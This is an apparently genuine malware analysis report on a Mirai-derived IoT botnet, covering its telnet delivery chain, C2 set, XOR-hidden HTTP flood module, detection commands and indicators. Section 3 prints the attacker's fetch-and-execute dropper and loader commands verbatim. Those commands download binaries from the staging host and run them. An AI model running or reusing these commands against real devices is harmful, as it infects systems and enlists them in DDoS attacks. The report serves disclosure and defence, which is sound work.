# MIRAI_OHSHIT — Analysis Report

**Lead sample:** `8b1a2fb6b358484b7769aeeb63209f2b277d91b5015cf28ce471a67e0ef83d28`
**TLP:WHITE** · Author: AfterPacket · Analysed: 2026-08-08 · Samples: 9

---

## 1. Incident summary

A multi-architecture Mirai-derived IoT botnet delivered over telnet from
`94.154.43.123` between 2026-08-04 and 2026-08-07. The full infection chain was
recovered: a 104-byte fetcher written to `/tmp/.p` pulls `ohshit.sh`, which
loops **15 architectures**, concatenates each payload into a file named `WTF`,
and executes it. Seven of the fifteen builds were captured. No sample in this
family carried a VirusTotal record at capture time — absence of data, not a
clean verdict.

Two findings materially change this family's assessment. The payloads embed a
**complete SSH client**, so the family propagates over SSH as well as telnet
despite a telnet-only loader chain. And all seven builds hide a **Layer-7 HTTP
flood module behind XOR 0x22**, invisible to plaintext extraction — this is a
DDoS platform, not merely a loader.

## 2. Phase 1 — Triage

| SHA-256 (8) | Role | Size | Type |
|---|---|---|---|
| `de9cfdf7` | `/tmp/.p` stage-1 fetcher | 104 B | ASCII, no line terminator |
| `8b1a2fb6` | `/ohshit.sh` stage-2 loader | 2527 B | Bourne-Again shell |
| `81ea2a39` | `//bot.arm7` | 727832 B | ELF32 ARM |
| `78a57de8` | `//bot.arm` | 956852 B | ELF32 ARM |
| `15b950d6` | `//bot.sh4` | 891044 B | ELF32 Renesas SH |
| `7b8add30` | `//bot.mips` | 1121448 B | ELF32 MIPS BE |
| `2ae7dc16` | `//bot.i686` | 1206876 B | ELF32 i386 |
| `98994017` | `//bot.ppc` | 1185928 B | ELF32 PowerPC BE |
| `9d7cd494` | `//bot.x86_64` | 1357648 B | ELF64 x86-64 |

MD5 and SHA-1 for all nine: `CAPTURE_20260807_hashes.txt`.
**Delivery:** telnet, shell-write, from `94.154.43.123` (HIGH — direct capture).

## 3. Phase 2 — Configuration block

**Stage 1** (`de9cfdf7`), the complete file:

```sh
cd /tmp; wget -q http://94.154.43.123/ohshit.sh -O ohshit.sh 2>/dev/null; sh ohshit.sh; rm -rf ohshit.sh
```

**Stage 2** (`8b1a2fb6`), lines 1–3 then a 15-line loop:

```sh
#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.43.123//bot.<arch>; \
  curl -O http://94.154.43.123//bot.<arch>;cat bot.<arch> >WTF;chmod +x *;./WTF
```

Architectures, in file order (lines 4–18):
`x86 mips arc i468 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4` — **15**.

Note `ulimit -n 1024` (raising the descriptor ceiling for scanning), the busybox
copy into `/tmp`, the five-way directory fallback, and the doubled slash in
`//bot.` — an artefact of the loader's URL construction and a reliable, low-noise
detection string.

**Payload C2 set**, identical across all seven builds (plaintext):

```
api-relay-3.metrics-collector.io      45.61.161.207
cdn-edge-updates.hostcloud-eu.net     45.83.140.28
mgmt-panel.serverstats-daemon.com     5.101.221.87
sync.softwaremirror.workers.dev       51.15.68.114
glibc.malloc.top                      94.130.53.201
control.tor2web-relay-fast.onion      195.201.24.6
```

**Obfuscated config**, XOR 0x22 — see §4.3.

## 4. Phase 3 — Capabilities

### 4.1 Multi-architecture delivery
No target fingerprinting. All 15 builds are fetched and executed in sequence;
wrong-architecture binaries simply fail. One telnet session therefore yields up
to 15 outbound HTTP requests — the detection opportunity.

### 4.2 SSH propagation *(code-present, unobserved)*
Payloads embed `ssh-ed25519`, `curve25519`, `chacha20`, `aes128-ctr`,
`hmac-sha2` and `@openssh.com` algorithm suffixes — a complete SSH client. The
loader chain is telnet-only. **Scoping containment from the dropper alone misses
this vector entirely.** Audit SSH auth logs on affected hosts.

### 4.3 Layer-7 HTTP flood, XOR 0x22 obfuscated *(code-present)*
Mirai's `table.c` XORs config with the four bytes of `TABLE_KEY`; the
leaked-source default `0xdeadbeef` collapses to one effective byte
(`0xef^0xbe^0xad^0xde = 0x22`). All seven builds carry such a region containing:

- `HTTP/1.1`, `User-Agent:`, `Accept:`, `Accept-Language:`, `Accept-Encoding:`,
  `Referer:`, `Cookie:`, `Origin:`, `Content-Type: application/x-www-form-urlencoded`
- A rotating User-Agent pool — archaic MSIE 8/9/10 and Trident 4/5/6 through
  current Chrome 131 and Firefox 126
- 20 Referer URLs of legitimate sites
- `http://www.useragentstring.com/Firefox25.0_id_19710.php` — the page the UA
  list was scraped from

Header and Referer randomisation is designed to defeat signature-based DDoS
filtering. Mitigation must be rate-based (see the framework document §4.5).

> **The 20 Referer domains are `google.com`, `facebook.com`, `cloudflare.com`
> and similar — flood header values, not infrastructure. Never blocklist them.
> The XOR region contains no C2 whatsoever, verified across all seven builds,
> which independently confirms `blocklist.txt` complete.**

Reproduce: `python3 tools/binstrings.py <payload>.bin --xor sweep` (0x22 wins
1025 to 45) then `--xor 0x22 --ioc`.

### 4.4 Anti-forensics
`rm -rf ohshit.sh` after execution; payload written to the generic name `WTF`.

## 5. Phase 4 — C2 protocol

HTTP over port 80 for staging and payload retrieval. Payload C2 reaches five
attacker-owned FQDNs, six hardcoded IPs, and one Tor hidden service. The
retrieval template `http://%s/bins.sh` is present in the binaries.

## 6. Phase 5 — Persistence

**None implemented.** Neither the loader chain nor the payloads install
persistence. Survival is by reinfection — the botnet re-scans and re-exploits.
A reboot clears the implant; it does not clear the exposure.

## 7. Phase 6 — Attribution

Mirai-derived, **HIGH confidence** — `table.c` XOR scheme, `/bins.sh` retrieval
template, busybox staging idiom and multi-arch loader are all canonical Mirai.
Heavily modified: stock Mirai is ~60–120 KB with no TLS, whereas these builds
are 0.7–1.4 MB and statically link a TLS stack and full SSH client. Treat as a
substantially reworked fork, not a stock recompile.

The C2 naming convention — every name impersonating ordinary infrastructure
(metrics collector, CDN edge, stats daemon, software mirror, glibc allocator) —
is consistent across the set and is itself an attribution signal.

## 8. Phase 7 — Host detection

```bash
ls -la /tmp/.p /tmp/WTF /tmp/bot.* /tmp/busybox 2>/dev/null
grep -rl "94.154.43.123\|//bot\." /tmp /var/tmp /home /root 2>/dev/null
find / -name "WTF" -type f 2>/dev/null
# SSH vector — do not omit
grep -iE "accepted|failed" /var/log/auth.log | tail -200
```

Network: DNS lookups for any of the five C2 FQDNs (Suricata 9001005–9001009);
`//bot.` in a URI (9001002); L7 flood indicators (9001011/9001012, thresholded).

## 9. Phase 8 — MITRE ATT&CK

| ID | Technique | Implementation |
|----|-----------|----------------|
| T1078.001 | Valid Accounts: Default | telnet with default credentials |
| T1059.004 | Unix Shell | two-stage shell chain |
| T1129 | Shared Modules | busybox copied to `/tmp` |
| T1027 | Obfuscated Files or Information | XOR 0x22 config table |
| T1070.004 | File Deletion | `rm -rf ohshit.sh` |
| T1021.004 | Remote Services: SSH | embedded SSH client |
| T1071.001 | Web Protocols | HTTP staging and C2 |
| T1090.003 | Multi-hop Proxy: Tor | `.onion` C2 |
| T1499.002 | Service Exhaustion Flood | L7 HTTP flood |

## 10. IOC table

| Type | Value | Confidence |
|------|-------|-----------|
| IP | `94.154.43.123` | HIGH — direct capture, staging + delivery |
| IP | `45.61.161.207`, `45.83.140.28`, `5.101.221.87`, `51.15.68.114`, `94.130.53.201`, `195.201.24.6` | HIGH — compiled into all 7 builds |
| Domain | the five C2 FQDNs in §3 | HIGH — compiled into all 7 builds |
| Onion | `control.tor2web-relay-fast.onion` | HIGH — not blocklistable |
| Path | `/tmp/.p`, `WTF`, `/tmp/busybox` | HIGH |
| String | `ohshit.sh`, `//bot.`, `>WTF`, `chmod +x *;./WTF` | HIGH |
| **Do not block** | `bugs.launchpad.net`, `185.199.108.153`, `104.21.234.17`, `workers.dev` apex, the 20 Referer domains | — |

**Artifacts:** `yara/MIRAI_OHSHIT_loader.yar`, `yara/MIRAI_OHSHIT_payload.yar` ·
`suricata/mirai_ohshit.rules` (9001001–9001012) · `ioc/MIRAI_OHSHIT_ioc.txt`
